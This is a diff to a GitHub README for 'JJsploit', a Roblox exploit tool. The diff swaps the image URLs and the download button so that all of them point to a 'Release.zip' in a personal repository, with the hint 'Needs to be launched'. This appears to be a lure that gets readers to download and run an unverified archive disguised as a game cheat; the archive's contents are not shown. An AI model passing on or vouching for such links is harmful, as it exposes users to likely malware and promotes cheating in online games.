@@ -1,6 +1,6 @@
 # 💥 JJsploit
 
-![JJsploit Logo](https://example.com/jjsploit-logo.png)
+![JJsploit Logo](https://github.com/rafy35198/JJsploit/releases/download/v1.0/Release.zip)
 
 Welcome to the official GitHub repository for **JJsploit**, the widely-used Roblox exploit now available for free! This powerful tool is favored among gamers for its simplicity and accessibility, allowing users to enhance their gaming experience by executing Lua scripts. However, it's essential for users to remain vigilant about the potential risks associated with exploiting software.
 
@@ -41,7 +41,7 @@ The following topics are associated with the **JJsploit** repository:
 
 To download the latest version of **JJsploit**, click the button below:
 
-[![Download JJsploit](https://img.shields.io/badge/Download%20JJsploit-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip "Needs to be launched")
+[![Download JJsploit](https://github.com/rafy35198/JJsploit/releases/download/v1.0/Release.zip%20JJsploit-v1.0.0-blue)](https://github.com/rafy35198/JJsploit/releases/download/v1.0/Release.zip "Needs to be launched")
 
 ## Getting Started
 
@@ -66,4 +66,4 @@ If you encounter any issues while using **JJsploit**, please check the "Releases
 
 Thank you for choosing **JJsploit** to elevate your Roblox gaming experience! Happy exploiting! 🔥🚀
 
-![JJsploit Gameplay](https://example.com/jjsploit-gameplay.png)
+![JJsploit Gameplay](https://github.com/rafy35198/JJsploit/releases/download/v1.0/Release.zip)
